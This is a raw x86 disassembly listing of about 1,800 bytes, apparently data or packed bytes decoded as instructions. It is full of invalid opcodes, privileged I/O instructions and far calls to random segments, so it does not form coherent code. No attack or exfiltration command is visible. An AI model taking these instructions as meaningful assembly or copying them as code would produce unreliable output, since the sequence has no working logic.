  448333:	push   ebp
  448334:	(bad)  
  448335:	fsubrp st(3),st
  448337:	stos   DWORD PTR es:[edi],eax
  448338:	jo     0x4483b8
  44833a:	(bad)  ds:0x701f66dd
  448340:	pusha  
  448341:	stc    
  448342:	adc    DWORD PTR [edx],edx
  448344:	xchg   edi,eax
  448345:	xchg   DWORD PTR [esi+0x1c],ebp
  448348:	and    al,BYTE PTR [edx]
  44834a:	mov    al,0x38
  44834c:	ds jl  0x4482fb
  44834f:	lods   eax,DWORD PTR ds:[esi]
  448350:	jno    0x4482ec
  448352:	in     al,dx
  448353:	aas    
  448354:	add    BYTE PTR [ebp+0x1a652bc2],0x65
  44835b:	icebp  
  44835c:	mov    dh,0xa2
  44835e:	xchg   ebx,eax
  44835f:	rol    DWORD PTR [ebx+0x68f68335],0x8f
  448366:	or     DWORD PTR [eax],ebx
  448368:	adc    DWORD PTR [ecx],0xffffff85
  44836b:	xchg   ebp,eax
  44836c:	add    eax,DWORD PTR [ebx]
  44836e:	retf   
  44836f:	cwde   
  448370:	shl    BYTE PTR ds:0x977f571f,1
  448376:	adc    BYTE PTR [edx+0x40],bl
  448379:	test   BYTE PTR [esi-0x1dccda46],al
  44837f:	int    0x9
  448381:	sub    esp,esp
  448383:	outs   dx,DWORD PTR ds:[esi]
  448384:	add    ah,BYTE PTR [eax]
  448386:	push   ds
  448387:	jge    0x4483ca
  448389:	repz jae 0x4483f9
  44838c:	cs adc eax,0x34c6d410
  448392:	fwait
  448393:	push   cs
  448394:	inc    edi
  448395:	push   esp
  448396:	mov    ss,WORD PTR [ebp+0x47a1e37b]
  44839c:	mov    BYTE PTR [edi-0xc],al
  44839f:	fcomp  DWORD PTR [ecx+0x5eb123a6]
  4483a5:	sbb    eax,0xf9ef0dd4
  4483aa:	outs   dx,DWORD PTR ds:[esi]
  4483ab:	dec    ebx
  4483ac:	or     DWORD PTR [ebx],ecx
  4483ae:	nop
  4483af:	ret    0xef8b
  4483b2:	std    
  4483b3:	and    DWORD PTR [esi],ecx
  4483b5:	xchg   esp,eax
  4483b6:	je     0x44836a
  4483b8:	xor    BYTE PTR [ebp-0x15852bff],cl
  4483be:	adc    bh,BYTE PTR [ebx-0x4d870ddf]
  4483c4:	xchg   edi,eax
  4483c5:	add    edx,DWORD PTR [ebx-0x133d9159]
  4483cb:	daa    
  4483cc:	adc    eax,0x514497c3
  4483d1:	imul   edx,DWORD PTR [edi-0x7c967616],0xdcca1975
  4483db:	aaa    
  4483dc:	mov    BYTE PTR [edi-0x6f89c629],dl
  4483e2:	addr16 (bad) 
  4483e4:	fstp   QWORD PTR [edx+0x8]
  4483e7:	mov    esp,DWORD PTR [ebp+0x3840401c]
  4483ed:	inc    ecx
  4483ee:	dec    edi
  4483ef:	fidiv  WORD PTR [edx]
  4483f1:	outs   dx,DWORD PTR ds:[esi]
  4483f2:	jl     0x448423
  4483f4:	fcomp  DWORD PTR [ecx-0x31d1e8c7]
  4483fa:	xchg   edx,eax
  4483fb:	inc    ecx
  4483fc:	lods   al,BYTE PTR ds:[esi]
  4483fd:	add    eax,0x64c5512
  448402:	jbe    0x4483e3
  448404:	hlt    
  448405:	push   cs
  448406:	xchg   ecx,eax
  448407:	out    0x1a,eax
  448409:	add    al,BYTE PTR [ebp+0x70b53f78]
  44840f:	out    0x44,al
  448411:	add    bh,BYTE PTR [edx+ebp*8]
  448414:	mov    ds:0x708e069f,eax
  448419:	sub    eax,0x62001b1f
  44841e:	mov    ds:0x974dfab4,eax
  448423:	aad    0x2c
  448425:	pop    ds
  448426:	pushf  
  448427:	ret    0x81a4
  44842a:	jp     0x44844a
  44842c:	mov    cl,al
  44842e:	test   ebp,esp
  448430:	add    edi,DWORD PTR [ebx]
  448432:	and    al,0x14
  448434:	sbb    al,0x14
  448436:	call   0xc3d7:0x22dbacc8
  44843d:	sbb    al,0x60
  44843f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448440:	mov    cl,cl
  448442:	jbe    0x44847e
  448444:	(bad)  
  448445:	sbb    bh,ch
  448447:	mov    ebx,DWORD PTR [eax-0x1d]
  44844a:	dec    esp
  44844b:	aad    0x24
  44844d:	es dec ecx
  44844f:	sbb    ah,dl
  448451:	iret   
  448452:	rcl    BYTE PTR [ebx],cl
  448454:	mov    BYTE PTR ds:0x6200568d,bl
  44845a:	test   ah,al
  44845c:	jl     0x448461
  44845e:	inc    eax
  44845f:	adc    cl,dl
  448461:	popa   
  448462:	retf   
  448463:	dec    edi
  448464:	test   ebp,0xeca1611f
  44846a:	sbb    ch,BYTE PTR ds:0xd730b9ae
  448470:	dec    edx
  448471:	shr    DWORD PTR fs:[ecx],1
  448474:	lock loope 0x44843b
  448477:	mov    eax,ds:0xd72337f1
  44847c:	dec    edx
  44847d:	scas   eax,DWORD PTR es:[edi]
  44847e:	test   DWORD PTR [ecx-0x3a37c213],esi
  448484:	mov    bh,0x5
  448486:	hlt    
  448487:	imul   ecx,DWORD PTR [ebx-0xb39b1f],0xb2618fdd
  448491:	es mov ah,0x36
  448494:	mov    eax,0x3e7eca02
  448499:	jl     0x44849a
  44849b:	aam    0xcb
  44849d:	mov    esi,0x966fefbb
  4484a2:	out    0x86,al
  4484a4:	mov    ah,BYTE PTR [ebp+0x228cc15d]
  4484aa:	sti    
  4484ab:	pop    eax
  4484ac:	push   0x63d71d27
  4484b1:	enter  0x9a8c,0xfe
  4484b5:	xchg   edx,eax
  4484b6:	pusha  
  4484b7:	pushf  
  4484b8:	mov    BYTE PTR [edi+0x194bacca],al
  4484be:	call   0xaf8b:0xd40301a8
  4484c5:	sbb    esp,0x6dcbecfb
  4484cb:	pop    ds
  4484cc:	mov    ecx,0x692b6b8f
  4484d1:	fcom   DWORD PTR [ebx+ebx*1-0x6a5bfa7d]
  4484d8:	sbb    ah,dh
  4484da:	mov    dl,BYTE PTR [esi]
  4484dc:	call   0x1fb1:0xe671aa27
  4484e3:	iret   
  4484e4:	cdq    
  4484e5:	xchg   ebp,eax
  4484e6:	(bad)  
  4484e7:	cmc    
  4484e8:	inc    BYTE PTR ds:0xdaabd94e
  4484ee:	push   ecx
  4484ef:	mov    ah,0xab
  4484f1:	dec    edi
  4484f2:	pop    ecx
  4484f3:	adc    DWORD PTR [ebx+ebp*4-0x13],edi
  4484f7:	popf   
  4484f8:	push   edx
  4484f9:	sbb    ebx,DWORD PTR [esi]
  4484fb:	jne    0x4484f3
  4484fd:	cs adc esp,edx
  448500:	or     ah,BYTE PTR [ebp+0x17]
  448503:	mov    bh,0x43
  448505:	push   ecx
  448506:	dec    esp
  448507:	ror    BYTE PTR [esi+0x3ac676d1],0x1c
  44850e:	icebp  
  44850f:	(bad)  
  448510:	mov    esp,0x64accfcf
  448515:	sbb    eax,0x2f7856dc
  44851a:	test   DWORD PTR [eax-0x26fb7d7a],edi
  448520:	ret    
  448521:	(bad)  
  448522:	pop    ebx
  448523:	sub    eax,0x56d355c
  448528:	dec    edi
  448529:	aaa    
  44852a:	pop    ds
  44852b:	call   0x790:0xe5f54d62
  448532:	(bad)  
  448533:	aad    0x6b
  448535:	out    0x3e,al
  448537:	imul   esi,DWORD PTR [eax-0x7835912b],0x65
  44853e:	pop    es
  44853f:	and    ebx,ebp
  448541:	xchg   esp,eax
  448542:	inc    eax
  448543:	ins    DWORD PTR es:[edi],dx
  448544:	test   DWORD PTR [eax-0x692ba7ec],esp
  44854a:	pop    ds
  44854b:	shl    BYTE PTR [edi+0x75def13b],1
  448551:	sti    
  448552:	xchg   esi,eax
  448553:	mov    bh,0x3a
  448555:	add    dl,BYTE PTR [eax-0x2049083d]
  44855b:	data16 inc BYTE PTR [ebx]
  44855e:	scas   al,BYTE PTR es:[edi]
  44855f:	jge    0x4485b6
  448561:	fwait
  448562:	int    0x5f
  448564:	call   edx
  448566:	ins    BYTE PTR es:[edi],dx
  448567:	loop   0x4484f1
  448569:	jnp    0x448599
  44856b:	jp     0x448538
  44856d:	xlat   BYTE PTR ds:[ebx]
  44856e:	es out dx,eax
  448570:	inc    ebp
  448571:	add    ah,BYTE PTR [edx+0x76]
  448574:	in     eax,0xb
  448576:	pop    ss
  448577:	add    DWORD PTR [ebx-0xff2921f],esp
  44857d:	call   0xd8b3:0xf989fca7
  448584:	mov    gs,WORD PTR [ecx]
  448586:	adc    al,0xfb
  448588:	dec    ebx
  448589:	inc    esp
  44858a:	lahf   
  44858b:	ins    DWORD PTR es:[edi],dx
  44858c:	or     al,0x46
  44858e:	mov    esi,0x44389c1
  448593:	enter  0xe19b,0xf7
  448597:	push   0x50c24692
  44859c:	push   0x3
  44859e:	mov    ch,0xb8
  4485a0:	nop
  4485a1:	fisub  WORD PTR [esp+ebx*4-0x77]
  4485a5:	emms   
  4485a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4485a8:	push   ebp
  4485a9:	ins    DWORD PTR es:[edi],dx
  4485aa:	add    BYTE PTR [eax+0x0],0x1
  4485ae:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4485b0:	add    dh,BYTE PTR [edx]
  4485b2:	les    ecx,FWORD PTR [edi]
  4485b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4485b5:	repnz in al,dx
  4485b7:	jns    0x448562
  4485b9:	fiadd  DWORD PTR [eax]
  4485bb:	retf   
  4485bc:	mov    DWORD PTR [ecx+0x5d04fbf],edx
  4485c2:	xor    eax,0x28021b39
  4485c7:	xchg   BYTE PTR [ecx-0x2f],dl
  4485ca:	fcomp  DWORD PTR [esp+ecx*4-0x26]
  4485ce:	pop    ebx
  4485cf:	jnp    0x4485b5
  4485d1:	sti    
  4485d2:	lahf   
  4485d3:	and    bl,ch
  4485d5:	outs   dx,DWORD PTR ds:[esi]
  4485d6:	lock ret 
  4485d8:	es add dh,al
  4485db:	adc    BYTE PTR [eax+0x186edb0d],0xda
  4485e2:	or     al,0xd0
  4485e4:	ins    DWORD PTR es:[edi],dx
  4485e5:	add    DWORD PTR [edi],ebx
  4485e7:	pop    ds
  4485e8:	pop    es
  4485e9:	rcl    edi,1
  4485eb:	mov    ds:0xd7205408,al
  4485f0:	jb     0x448648
  4485f2:	loopne 0x4485db
  4485f4:	imul   edi,DWORD PTR [ecx],0xab9640e0
  4485fa:	es pop edi
  4485fc:	(bad)
  448600:	mov    esi,0xc9d2ed58
  448605:	sbb    esp,DWORD PTR [eax+0x6e]
  448608:	jo     0x4485ae
  44860a:	pop    edi
  44860b:	data16 fs icebp 
  44860e:	jge    0x448605
  448610:	fstp   QWORD PTR [esi+0x5e57ab4c]
  448616:	fs push esi
  448618:	in     al,0x55
  44861a:	mov    ebx,0xb802eb75
  44861f:	push   0x5c
  448621:	js     0x4485d4
  448623:	loop   0x448668
  448625:	pop    edx
  448626:	out    dx,al
  448627:	lahf   
  448628:	xor    eax,DWORD PTR [ebx]
  44862a:	test   al,0xd2
  44862c:	inc    edx
  44862d:	addr16 ret 0x23b7
  448631:	sbb    al,0x54
  448633:	xor    al,0x66
  448635:	ret    0xdaa3
  448638:	test   al,0x3a
  44863a:	scas   eax,DWORD PTR es:[edi]
  44863b:	cmc    
  44863c:	mov    DWORD PTR [ecx+0x40a22ed1],edi
  448642:	jle    0x4486ab
  448644:	shl    ch,0xab
  448647:	loope  0x44862e
  448649:	add    al,BYTE PTR [edx+0x3d7a3658]
  44864f:	clc    
  448650:	shl    DWORD PTR [edi+0x63],1
  448653:	scas   eax,DWORD PTR es:[di]
  448655:	scas   al,BYTE PTR es:[edi]
  448656:	imul   edx,DWORD PTR [edi],0x7861c327
  44865c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44865d:	dec    eax
  44865e:	xchg   esp,eax
  44865f:	xchg   edi,eax
  448660:	pop    edi
  448661:	or     DWORD PTR [edx],0x33
  448664:	xlat   BYTE PTR ds:[ebx]
  448665:	xor    dl,cl
  448667:	mov    esi,0x49685f89
  44866c:	xchg   ecx,eax
  44866d:	xchg   edi,eax
  44866e:	lahf   
  44866f:	(bad)  
  448670:	jle    0x448678
  448672:	push   0x62e949d4
  448677:	out    0xde,al
  448679:	int3   
  44867a:	add    al,0x9d
  44867c:	mov    BYTE PTR [ebp+0x71],al
  44867f:	lods   al,BYTE PTR ds:[esi]
  448680:	mov    al,ds:0xe808a9b1
  448685:	dec    edx
  448686:	jle    0x448612
  448688:	test   BYTE PTR [edx+0x2cfd95ef],al
  44868e:	cmc    
  44868f:	dec    edx
  448690:	mov    BYTE PTR [ebp+0x29863d7],ah
  448696:	mov    eax,ds:0x7005f6c7
  44869b:	ret    0x53ea
  44869e:	pop    esp
  44869f:	out    dx,al
  4486a0:	retf   0x60f2
  4486a3:	and    ebx,DWORD PTR [ecx]
  4486a5:	push   edi
  4486a6:	scas   al,BYTE PTR es:[edi]
  4486a7:	adc    esp,esp
  4486a9:	call   0x837e:0x3dbad55c
  4486b0:	and    eax,0x88a45b15
  4486b5:	imul   edx,DWORD PTR [ecx],0xffffffdb
  4486b8:	or     dl,0xf1
  4486bb:	sbb    ebx,eax
  4486bd:	add    eax,0x9eb2edc4
  4486c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4486c3:	loope  0x448702
  4486c5:	das    
  4486c6:	push   ds
  4486c7:	and    eax,0x7d4366b9
  4486cc:	loop   0x4486f2
  4486ce:	sahf   
  4486cf:	(bad)  
  4486d1:	daa    
  4486d2:	push   0x9f0d66a2
  4486d7:	test   eax,0xb1cf3213
  4486dc:	(bad)  
  4486dd:	mov    eax,ds:0xac084f81
  4486e2:	(bad)  
  4486e3:	fisubr DWORD PTR [eax-0x90d78f9]
  4486e9:	add    eax,0xf2407650
  4486ee:	leave  
  4486ef:	out    0xc5,eax
  4486f1:	inc    edi
  4486f2:	sbb    DWORD PTR fs:[edi+0x1e],ecx
  4486f6:	call   0xfaf746d8
  4486fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4486fc:	adc    al,0xef
  4486fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4486ff:	aad    0xbb
  448701:	ror    BYTE PTR [ebp+0x6f],0x2c
  448705:	js     0x448786
  448707:	popa   
  448708:	xchg   esi,eax
  448709:	leave  
  44870a:	iret   
  44870b:	push   0xe39fc395
  448710:	adc    al,0x41
  448712:	out    0xf0,al
  448714:	or     eax,DWORD PTR [ebx]
  448716:	js     0x4486a5
  448718:	inc    ecx
  448719:	mov    al,BYTE PTR [eax+0x38]
  44871c:	out    dx,al
  44871d:	xor    ebx,DWORD PTR [esi]
  44871f:	mov    ecx,0xb9191aad
  448724:	mov    edi,0x31458ccd
  448729:	jo     0x4487a5
  44872b:	mov    ch,dh
  44872d:	inc    ebp
  44872e:	fstp   QWORD PTR [ecx-0x79]
  448731:	je     0x4486ff
  448733:	add    eax,0x2c1caa1d
  448738:	xchg   BYTE PTR [edi],ch
  44873a:	jp     0x448794
  44873c:	mov    bh,ch
  44873e:	ret    0x3ac2
  448741:	mov    eax,eax
  448743:	not    bl
  448745:	(bad)  
  448746:	adc    esp,ebx
  448748:	cld    
  448749:	add    al,0x76
  44874b:	adc    BYTE PTR [ecx],dh
  44874d:	arpl   WORD PTR [edi],bx
  44874f:	and    ecx,ecx
  448751:	mov    ecx,fs
  448753:	dec    BYTE PTR [eax-0x6a40f5d5]
  448759:	mov    ds:0x2ef26de,eax
  44875e:	or     al,0x78
  448760:	mov    ecx,0xd9652a97
  448765:	fs push ds
  448767:	shld   DWORD PTR [ebp-0x73291984],esp,cl
  44876e:	jne    0x448742
  448770:	scas   al,BYTE PTR es:[edi]
  448771:	call   0x970f:0x8015919c
  448778:	jo     0x448734
  44877a:	pop    ds
  44877b:	cdq    
  44877c:	xchg   sp,ax
  44877e:	sbb    ecx,DWORD PTR [eax-0x63b50cc0]
  448784:	dec    edi
  448785:	(bad)  
  448786:	xor    edx,esp
  448788:	push   ecx
  448789:	call   0x6a742f28
  44878e:	or     ecx,DWORD PTR ss:[eax-0x6a6f5a2b]
  448795:	xchg   esp,eax
  448796:	mov    esi,0x30021703
  44879b:	add    al,0x54
  44879d:	retf   0x5e5f
  4487a0:	rol    BYTE PTR [eax],cl
  4487a2:	pop    edx
  4487a3:	sub    eax,eax
  4487a5:	punpcklbw mm1,DWORD PTR [edi]
  4487a8:	sbb    DWORD PTR [edx+0x73e58770],ebx
  4487ae:	and    ah,BYTE PTR [ecx]
  4487b0:	xor    BYTE PTR [ebp-0x7e02383a],0xce
  4487b7:	inc    edi
  4487b8:	dec    ecx
  4487b9:	push   es
  4487ba:	sbb    BYTE PTR [eax+0x39d1b189],0xa3
  4487c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4487c2:	mov    edx,0xa1f42485
  4487c7:	aad    0x34
  4487c9:	punpcklwd mm7,DWORD PTR [ecx+0x16b349c8]
  4487d0:	mov    DWORD PTR [ecx-0x8bd0226],esp
  4487d6:	ret    0x3f0d
  4487d9:	dec    eax
  4487da:	inc    esp
  4487db:	mov    ds:0xd79f1c88,al
  4487e0:	repnz icebp 
  4487e2:	lock sub cl,0xa8
  4487e6:	pop    ds
  4487e7:	cmc    
  4487e8:	push   es
  4487e9:	sbb    eax,0xef825c7e
  4487ee:	call   0x629d97c7
  4487f3:	fbstp  TBYTE PTR [ecx]
  4487f5:	cdq    
  4487f6:	add    al,0xdd
  4487f8:	mov    BYTE PTR [ecx],ah
  4487fa:	jno    0x448876
  4487fc:	cs cld 
  4487fe:	es jbe 0x448838
  448801:	add    cl,BYTE PTR [eax]
  448803:	sub    eax,0x944b0a1d
  448808:	and    DWORD PTR [eax],ecx
  44880a:	pop    di
  44880c:	jmp    ebx
  44880e:	outs   dx,BYTE PTR ds:[esi]
  44880f:	cmp    DWORD PTR [edi-0x1d],ebx
  448812:	test   BYTE PTR [edi-0x34],dl
  448815:	add    ah,dh
  448817:	sbb    DWORD PTR [eax-0x1cf2e72d],esi
  44881d:	push   edx
  44881e:	pusha  
  44881f:	pop    edi
  448820:	mov    DWORD PTR [edi+eiz*4],edx
  448823:	jg     0x448893
  448825:	cmp    al,0xbe
  448827:	int    0x44
  448829:	retf   
  44882a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44882b:	and    al,0xb5
  44882d:	retf   
  44882e:	cmp    DWORD PTR [ebx+esi*1-0xf],edx
  448832:	lds    edx,FWORD PTR [ebx+0xc]
  448835:	mov    al,0x7d
  448837:	rol    DWORD PTR [esi+eax*1],0x27
  44883b:	push   esp
  44883c:	adc    esi,0xffffffa6
  44883f:	inc    ecx
  448840:	inc    esi
  448841:	addr16 dec edx
  448843:	xchg   ecx,eax
  448844:	fs add ah,dh
  448847:	aas    
  448848:	scas   al,BYTE PTR es:[edi]
  448849:	adc    ebp,DWORD PTR [esi+ebx*1-0x78]
  44884d:	ins    DWORD PTR es:[edi],dx
  44884e:	clc    
  44884f:	cdq    
  448850:	inc    ebx
  448851:	fdiv   DWORD PTR [esi]
  448853:	or     DWORD PTR [esi-0x6bae81cb],ebx
  448859:	inc    ecx
  44885a:	stos   DWORD PTR es:[edi],eax
  44885b:	ins    BYTE PTR es:[edi],dx
  44885c:	mov    al,0xd5
  44885e:	or     esp,edi
  448860:	mov    eax,DWORD PTR [edx+0x3cb7a416]
  448866:	out    0xdc,al
  448868:	es push es
  44886a:	dec    ebx
  44886b:	xlat   BYTE PTR ds:[ebx]
  44886c:	es pop edi
  44886e:	push   ecx
  44886f:	repnz inc BYTE PTR [ecx]
  448872:	mov    ebp,0x1f55860c
  448877:	pop    ebp
  448878:	lahf   
  448879:	dec    ebp
  44887a:	cdq    
  44887b:	adc    BYTE PTR [edx-0x36],0xf7
  44887f:	xlat   BYTE PTR ds:[ebx]
  448880:	mov    esi,0x50981440
  448885:	cmp    DWORD PTR [edi+0x24],esi
  448888:	jb     0x44880c
  44888a:	jb     0x44888b
  44888c:	pop    edi
  44888d:	jmp    0x44889a
  44888f:	xlat   BYTE PTR ds:[ebx]
  448890:	popf   
  448891:	call   DWORD PTR [ecx]
  448893:	les    eax,FWORD PTR cs:[edx]
  448896:	inc    esp
  448897:	into   
  448898:	enter  0x32bd,0x9d
  44889c:	out    dx,eax
  44889d:	imul   ebx,DWORD PTR [edi],0x6d
  4488a0:	das    
  4488a1:	add    al,0x96
  4488a3:	arpl   dx,bx
  4488a5:	js     0x448872
  4488a7:	aam    0x2c
  4488a9:	dec    ecx
  4488aa:	xchg   ah,cl
  4488ac:	and    al,ah
  4488ae:	dec    eax
  4488af:	mov    BYTE PTR [ebx+0x4aa8d6c9],0xa2
  4488b6:	pop    ds
  4488b7:	clc    
  4488b8:	mov    edx,0xadd4c7c2
  4488bd:	psrlw  mm5,QWORD PTR [ebx+0x157d42a2]
  4488c4:	js     0x4488cc
  4488c6:	pusha  
  4488c7:	pop    ebx
  4488c8:	push   ebp
  4488c9:	loope  0x448865
  4488cb:	dec    BYTE PTR [edx+0x70d4e2de]
  4488d1:	leave  
  4488d2:	in     al,dx
  4488d3:	fisub  WORD PTR [eax]
  4488d5:	dec    ecx
  4488d6:	adc    DWORD PTR [edi-0x77],ebx
  4488d9:	inc    ecx
  4488da:	dec    esp
  4488db:	cmp    ah,BYTE PTR [edx+0x19f72d98]
  4488e1:	push   ss
  4488e2:	or     al,0xd4
  4488e4:	shr    BYTE PTR [esi],1
  4488e6:	mov    ah,0x50
  4488e8:	mov    esp,DWORD PTR [ebp+0x2c657a78]
  4488ee:	cwde   
  4488ef:	sbb    eax,0xaaed3310
  4488f4:	pusha  
  4488f5:	rol    BYTE PTR [edx-0x70],cl
  4488f8:	popf   
  4488f9:	and    BYTE PTR gs:[esi],al
  4488fc:	pop    edi
  4488fd:	mov    ebx,0xfe592760
  448902:	mov    cl,0xcf
  448904:	jl     0x448933
  448906:	add    DWORD PTR [ebp+0x2c539f82],ebp
  44890c:	dec    ecx
  44890d:	es dec edi
  44890f:	out    dx,al
  448910:	aas    
  448911:	retf   
  448912:	pusha  
  448913:	lods   eax,DWORD PTR ds:[esi]
  448914:	mov    esi,0x586e57b2
  448919:	mov    al,0xce
  44891b:	call   0x2a36:0xd5e03c11
  448922:	adc    eax,DWORD PTR [ecx-0x31]
  448925:	pop    es
  448926:	pusha  
  448927:	cmc    
  448928:	das    
  448929:	xor    ch,BYTE PTR [ebp-0x5c]
  44892c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44892d:	sub    bl,dh
  44892f:	aam    0x85
  448931:	rol    BYTE PTR [ecx+0x4e],cl
  448934:	and    al,0x4f
  448936:	hlt    
  448937:	out    0x96,eax
  448939:	(bad)
  44893d:	add    al,BYTE PTR [eax]
  44893f:	mov    eax,ds:0xd56bc164
  448944:	scas   al,BYTE PTR es:[edi]
  448945:	jb     0x448960
  448947:	cmc    
  448948:	xor    BYTE PTR [edi],cl
  44894a:	call   0x170e1289
  44894f:	add    esi,DWORD PTR [ebx]
  448951:	or     eax,DWORD PTR [edi-0x65b8b389]
  448957:	outs   dx,BYTE PTR ds:[esi]
  448958:	sbb    al,BYTE PTR [edx]
  44895a:	das    
  44895b:	jno    0x4489d9
  44895d:	test   DWORD PTR cs:[edi],ecx
  448960:	pop    edi
  448962:	cmp    al,0x40
  448964:	push   edx
  448965:	dec    ebx
  448966:	jno    0x4489ac
  448968:	in     al,dx
  448969:	out    0xd6,al
  44896b:	aam    0x46
  44896d:	xor    dl,BYTE PTR [eax+ebp*8-0x19852093]
  448974:	mov    DWORD PTR [ebx+0x595b5f94],ebx
  44897a:	mov    ebx,0xe202276b
  44897f:	dec    edx
  448980:	mov    cl,dh
  448982:	mov    edi,0x1e281b05
  448987:	and    ebp,edi
  448989:	aas    
  44898a:	push   edi
  44898b:	mov    ebp,edx
  44898d:	and    bh,dl
  44898f:	lds    edx,FWORD PTR [esi+0xe]
  448992:	rcl    dl,cl
  448994:	mov    ah,0x66
  448996:	mov    ds:0x455c7edf,eax
  44899b:	xchg   esp,eax
  44899c:	fsub   DWORD PTR [eax+0x3b883bce]
  4489a2:	nop
  4489a3:	dec    ebp
  4489a4:	hlt    
  4489a5:	loop   0x448989
  4489a7:	adc    eax,0x31fc05c4
  4489ac:	daa    
  4489ad:	cmp    DWORD PTR [ecx-0x6d],ebp
  4489b0:	sbb    eax,0x2ef1657e
  4489b5:	xor    BYTE PTR [edx],ch
  4489b7:	fiadd  WORD PTR ds:0xfcd6c2e3
  4489bd:	add    ah,BYTE PTR [eax-0x7f99b446]
  4489c3:	mov    al,0x11
  4489c5:	add    BYTE PTR [edi+ebp*1+0x79],ch
  4489c9:	push   edi
  4489ca:	(bad)  
  4489cb:	hlt    
  4489cc:	mov    cs,WORD PTR [ecx+0x112935f9]
  4489d2:	pop    esp
  4489d3:	and    eax,0x216d4be0
  4489d8:	add    al,0x43
  4489da:	cmp    edi,edx
  4489dc:	inc    edi
  4489dd:	jmp    0xb4c23c83
  4489e2:	pusha  
  4489e3:	adc    eax,0x587069b3
  4489e8:	dec    ebp
  4489e9:	and    bl,0x7d
  4489ec:	cs jmp 0x74de:0x5865ba30
  4489f4:	push   esp
  4489f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4489f6:	fstp   TBYTE PTR [eax-0x5a960199]
  4489fc:	pop    edx
  4489fd:	mov    ss,WORD PTR [edi-0x6d377760]
  448a03:	push   esp
  448a04:	add    DWORD PTR ds:0x265f65f0,0xffffffe6
  448a0b:	or     eax,0x91e4484
  448a10:	and    BYTE PTR [eax+eiz*4-0x35],0x2
  448a15:	cdq    
  448a16:	xchg   esp,edx
  448a18:	call   0xd566e51c
  448a1d:	inc    ecx
  448a1e:	mov    cl,BYTE PTR [esi]
  448a20:	mov    DWORD PTR [ecx+0x6bed6eaf],esp
  448a26:	aas    
  448a27:	ds stc 
  448a29:	add    eax,0x87917a48
  448a2e:	popa   
  448a2f:	shl    cl,0xb9
  448a32:	pop    ds
  448a33:	push   ebx
  448a34:	mov    ds:0x5caf9fd1,al
  448a39:	pop    ebp
  448a3a:	ins    BYTE PTR es:[edi],dx
  448a3b:	aam    0xc4
  448a3d:	fs mov bl,0x6d
  448a40:	out    dx,al
  448a41:	loop   0x4489e6
  448a43:	fwait
  448a44:	mov    esp,ebx
  448a46:	jbe    0x448a07
  448a48:	and    eax,0x1859508d
  448a4d:	mov    eax,ds:0x588dd56c
  448a52:	call   0x36acb636
  448a57:	push   ds
  448a58:	mov    DWORD PTR [edi],ebx
  448a5a:	or     BYTE PTR [ecx],ah
  448a5c:	push   ecx
  448a5d:	ins    DWORD PTR es:[edi],dx
  448a5e:	mov    ah,BYTE PTR [esi-0x2]
  448a61:	xor    al,0xd6
  448a63:	ss lahf 
  448a65:	add    bh,BYTE PTR [eax-0x12]
  448a68:	rcr    DWORD PTR es:[edi+0x24],cl
  448a6c:	mov    DWORD PTR [ecx+0x40166a1a],ebx
  448a72:	das    
  448a73:	cmc    
  448a74:	and    ecx,DWORD PTR [edi+0x11899cc5]
  448a7a:	scas   eax,DWORD PTR es:[edi]
  448a7b:	dec    edi
  448a7c:	lds    ebx,FWORD PTR [esi]
  448a7e:	loop   0x448a65
  448a80:	mov    ecx,esi
  448a82:	ror    DWORD PTR [esi],1
  448a84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448a85:	push   ss
  448a86:	mov    esi,esi
  448a88:	fiadd  WORD PTR [edx]
  448a8a:	in     al,dx
  448a8b:	jnp    0x448ab5
  448a8d:	inc    edx
  448a8e:	xlat   BYTE PTR ds:[ebx]
  448a8f:	dec    ecx
  448a90:	mov    ah,0xad
  448a92:	jnp    0x448b05
  448a94:	jae    0x448a90
  448a96:	add    al,0xd7
  448a98:	daa    
  448a99:	fisttp DWORD PTR [ecx]
  448a9b:	les    esi,FWORD PTR [ebx+0x34f8a01e]
  448aa1:	sbb    bl,BYTE PTR ds:0x434649bf
  448aa7:	ror    DWORD PTR [esi+0xac356fb],0xe2
  448aae:	inc    ecx
  448aaf:	and    eax,0xd5a7b10e
  448ab4:	in     al,dx
  448ab5:	leave  
  448ab6:	and    eax,DWORD PTR [eax+0x3061b2ea]
  448abc:	mov    edx,DWORD PTR [ebx+0x508cf47c]
  448ac2:	(bad)  
  448ac3:	loop   0x448b2d
  448ac5:	out    0x1e,al
  448ac7:	xlat   BYTE PTR ds:[ebx]
  448ac8:	imul   DWORD PTR [ebx]
  448aca:	es imul esi,ebx,0x33
  448ace:	es sbb al,0x8d
  448ad1:	out    dx,eax
  448ad2:	inc    edi
  448ad3:	cdq    
  448ad4:	or     ch,BYTE PTR [esi]
  448ad6:	dec    edx
  448ad7:	push   ebp
  448ad8:	xor    bl,BYTE PTR [eax-0x7b]
  448adb:	mov    ecx,0x8ee7329c
  448ae0:	or     dh,dl
  448ae2:	popf   
  448ae3:	pop    ebp
  448ae4:	adc    al,ch
  448ae6:	sub    esp,ebp
  448ae8:	dec    edi
  448aea:	not    ebp
  448aec:	push   ebp
  448aee:	mov    cl,0xa2
  448af0:	lods   al,BYTE PTR ds:[esi]
  448af1:	mov    ecx,0xcbbad0eb
  448af6:	js     0x448afa
  448af8:	cmp    BYTE PTR [esi-0x21],ah
  448afb:	sbb    BYTE PTR ds:[edx],bh
  448afe:	dec    edi
  448aff:	in     al,0x89
  448b01:	lds    edx,FWORD PTR [ebp-0x7f5df89c]
  448b07:	adc    DWORD PTR [ebx+0x3],esp
  448b0a:	fdiv   DWORD PTR [eax+0x13c18b73]
  448b10:	sbb    BYTE PTR cs:[ecx-0x37],ah
  448b14:	push   ds
  448b15:	fcmovb st,st(3)
  448b17:	popa   
  448b18:	and    al,0xd5
  448b1a:	sub    BYTE PTR [edi],cl
  448b1c:	daa    
